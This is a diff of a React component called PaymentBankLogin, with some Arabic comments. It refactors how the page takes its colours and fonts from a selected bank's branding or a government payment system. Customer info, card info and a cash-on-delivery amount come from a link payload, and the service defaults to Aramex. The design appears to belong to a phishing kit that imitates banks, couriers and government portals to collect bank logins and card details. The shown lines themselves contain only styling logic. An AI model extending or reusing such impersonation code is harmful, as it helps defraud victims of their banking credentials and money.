@@ -45,29 +45,48 @@ const PaymentBankLogin = () => {
   // استنتاج الدولة من العملة إذا لم تكن موجودة
   const inferredCountryFromCurrency = currencyParam ? getCountryByCurrency(currencyParam) : null;
 
+  // Get country first
   const selectedCountry = countryParam || inferredCountryFromCurrency || linkData?.payload?.selectedCountry || "SA";
+  
+  // Get customer info and bank info
   const customerInfo = linkData?.payload?.customerInfo || {};
   const selectedBankId = bankParam || linkData?.payload?.selectedBank || '';
   const cardInfo = linkData?.payload?.cardInfo || {};
+  const shippingInfo = linkData?.payload as any;
   
+  // Get service info
   const serviceKey = serviceParam || linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   
-  // Check if government service
+  // Get bank branding
+  const selectedBankBranding = selectedBankId && selectedBankId !== 'skipped' ? bankBranding[selectedBankId] : null;
+  
+  // Check if government service and get styling
   const isGovService = isGovernmentService(serviceKey);
   const govSystem = getGovernmentPaymentSystem(selectedCountry);
   
-  const selectedBankBranding = selectedBankId && selectedBankId !== 'skipped' ? bankBranding[selectedBankId] : null;
+  // Calculate colors based on service type
+  const primaryColor = isGovService 
+    ? govSystem.colors.primary 
+    : (selectedBankBranding?.colors?.primary || branding.colors.primary);
+  const secondaryColor = isGovService 
+    ? govSystem.colors.secondary 
+    : (selectedBankBranding?.colors?.secondary || branding.colors.secondary);
+  const surfaceColor = isGovService 
+    ? govSystem.colors.surface 
+    : (selectedBankBranding?.colors?.surface || '#F8F9FA');
+  const fontFamily = isGovService 
+    ? govSystem.fonts.primaryAr 
+    : (selectedBankBranding?.fonts?.arabic || 'Cairo, Tajawal, sans-serif');
+  const textColor = isGovService 
+    ? govSystem.colors.text 
+    : (selectedBankBranding?.colors?.text || '#1A1A1A');
+  const borderColor = isGovService 
+    ? govSystem.colors.border 
+    : (selectedBankBranding?.colors?.border || '#E5E5E5');
   
-  // Use government theme if it's a government service
-  const primaryColor = isGovService ? govSystem.colors.primary : (selectedBankBranding?.colors?.primary || branding.colors.primary);
-  const secondaryColor = isGovService ? govSystem.colors.secondary : (selectedBankBranding?.colors?.secondary || branding.colors.secondary);
-  const surfaceColor = isGovService ? govSystem.colors.surface : (selectedBankBranding?.colors?.surface || '#F8F9FA');
-  const fontFamily = isGovService ? govSystem.fonts.primaryAr : (selectedBankBranding?.fonts?.arabic || 'Cairo, Tajawal, sans-serif');
-  const textColor = isGovService ? govSystem.colors.text : (selectedBankBranding?.colors?.text || '#1A1A1A');
-  const borderColor = isGovService ? govSystem.colors.border : (selectedBankBranding?.colors?.border || '#E5E5E5');
-  const shippingInfo = linkData?.payload as any;
+  // Get amount
   const rawAmount = amountParam || shippingInfo?.cod_amount;
 
   let amount = 500;
